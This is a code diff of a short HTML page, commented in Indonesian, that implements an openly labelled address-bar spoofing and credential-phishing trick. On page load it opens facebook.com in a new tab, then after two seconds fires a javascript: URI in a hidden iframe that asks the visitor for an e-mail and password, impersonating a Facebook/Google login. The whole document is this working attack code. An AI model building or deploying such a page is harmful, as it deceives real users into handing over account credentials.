@@ -2,18 +2,22 @@
 <html>
   <body>
     <button onclick="spoof()">Click to spoof</button>
-    
-    <script>  
+
+    <script>
       function spoof() {
         // 1. Buka tab baru ke domain target (untuk spoof address bar)
         let win = window.open("https://www.facebook.com:80", "_blank");
 
-        // Triggers fake prompt via javascript URI
-        document.getElementById("iframe").src =
-          'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
+        setTimeout(() => {
+          document.getElementById("iframe").src =
+            'javascript:prompt("In order to access Facebook.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+        }, 2000);
       }
-      spoof();
+
+      spoof(); // Auto-run saat halaman dibuka
     </script>
+
     <iframe id="iframe" style="display:none;" src=""></iframe>
   </body>
 </html>
